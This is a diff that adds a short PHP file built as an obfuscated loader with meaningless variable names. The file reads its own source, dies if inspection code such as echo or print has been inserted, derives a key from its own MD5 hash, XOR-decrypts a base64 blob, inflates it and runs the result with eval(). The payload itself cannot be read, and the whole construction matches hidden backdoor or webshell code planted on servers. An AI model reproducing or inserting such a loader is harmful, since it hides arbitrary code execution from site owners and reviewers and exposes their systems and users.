@@ -1,0 +1,24 @@
+<?php
+$xzlpbyp="3ea2fa7cc5feefc0616f2359000842ca";
+$oeeanonk="500405565f56040700075e0150515005075502000b5657000200555d50005a59";
+$euqkdg="rjSbKuIHIxr26WxN/GMZyze1nsN4jmbU5i/+QySj0mRCrelX4laYdGwB1TVNhq6oNWYZxsgiV5B4/5OcionWA7hIP8b3L3SMBevh7blm20j5EQVYrW+tw/6AXLbcPWUIzsBDQMbZD4VlAK04BrTjvdafpINK9BJh1hlS7CgTs4Av1DVdDgkKaEolJCSvPCLl5+KNKs0rWafhbPAGC9079eOX1PBaghS85OmNvEa80YZRT2AY+mgyNNAW8ROIXrx08I4nql02BgtbCpCd7kK2E2ZNqBwDgn6MxNDFaG8UDQ6iIsHASwRigBhcZy+Wb3f7xaxXHs4iIH/maB1aFlZTv/sFxHcZraTWhjff0i0wkB0OtYlk+VY3PV2yoGHxLJaaUe2hclOl2i49gmBOjY3IOJlpSS2ZlF8PkWYQFBLojZQ1X9h7NRDSHGmx2RAxUu8dQmZclnKJM3vSmyAOczg9yMYaWG8e10T+A035nxOrjRfqXaSWIk7Ft3C38FanHfgHaB4VqGVsB5R8ypqyuSNhOOUP6msQwbs87CI8aLhbahv9dVca6Ztij91jKaDnfTUFSEtMI8h7Xj0+OgOy/wp2ZwwCP6uKrcengEIipuRPR4eXrePp2F3mPlPYfRHECdXvl9A3qxLGrG4zoI5KdLvJeBvYTmIUkmhMHDx0MzdTuGxeyFRFLDmUFFuoNcPLsDOtN0rHslUkdYY2Ro/c6OwATFnRfyQiQQS5+fZRPV7mQO9etGnJJzgcdjncb5Q00QVT2kL60dOQj1Lv2w0UJvISW3O6hn9r36WUr/lBUL5o7rFzxe/XoCeYqQf/C5wBLT/YuiCXen+mpYC7mfl1MZZvc5Td6qLERz/ZDH0ZJgqrLw+77857nn6bo4vFuw8yZGgIBUyzc0/HUTNzIm89ZHayhrsUmxUMNPXvf64fLDi6U6fTLHRdchCrorZjUQwvoy6WoUNt5JAcxtaJxfLCgnrikmugb423I4qjAJbrwvgBoSt4kadP8/0rjKe05pFeAwGtMPSo03tcPN0/0DHdfk04o9+7WQJgwwqtQkxIBLmhD25SPaK/hg==";
+$vqdxels=file_get_contents(__FILE__);
+$wiybetdz=str_replace($euqkdg,"",$vqdxels);
+if(strpos($wiybetdz,"ec"."ho")!==false||strpos($wiybetdz,"pr"."int")!==false||strpos($wiybetdz,"var_"."dump")!==false||strpos($wiybetdz,"file_put_"."contents")!==false||strpos($wiybetdz,"fw"."rite")!==false){die();}
+$cmeaibpthx=str_replace(array($xzlpbyp,$oeeanonk),array("SP_4d1ef057","KP_6aec3c58"),$vqdxels);
+$uijqkayyy=md5($cmeaibpthx);
+$xdrdjddqierp=hex2bin($oeeanonk);
+$trahdel="";
+$kzxpiiyq=strlen($uijqkayyy);
+for($byfkeccxhm=0;$byfkeccxhm<$kzxpiiyq;$byfkeccxhm++){
+    $trahdel.=chr(ord($xdrdjddqierp[$byfkeccxhm])^ord($uijqkayyy[$byfkeccxhm]));
+}
+$qcuvurlezbl=base64_decode($euqkdg);
+$xwzhpmqu=strlen($qcuvurlezbl);
+$gkkenpcoja="";
+$islohadyat=strlen($trahdel);
+for($byfkeccxhm=0;$byfkeccxhm<$xwzhpmqu;$byfkeccxhm++){
+    $gkkenpcoja.=$qcuvurlezbl[$byfkeccxhm]^$trahdel[$byfkeccxhm%$islohadyat];
+}
+$dbomdhcuucj="gz"."in"."fl"."ate";
+eval($dbomdhcuucj($gkkenpcoja));
